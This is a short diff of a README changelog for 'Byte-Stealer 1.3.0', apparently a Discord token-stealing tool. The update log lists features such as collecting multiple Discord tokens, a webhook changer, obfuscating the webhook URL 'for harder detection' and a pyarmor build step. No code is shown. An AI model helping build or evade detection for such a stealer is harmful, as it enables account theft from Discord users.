@@ -14,6 +14,7 @@ DO NOT USE LATEST RELEASE IT WILL NOT WORK, download the zip from here https://g
 # Byte-Stealer 1.3.0
 Current Update Log:
 ```
+Edit Buildexe.bat for pyarmor error
 Added Embed fields for multiple Discord tokens 
 Added a webhook editor/changer without opening the code+flipping webhookurl for harder detection
 Removed a couple unnecessary libraries and functions/optimisation
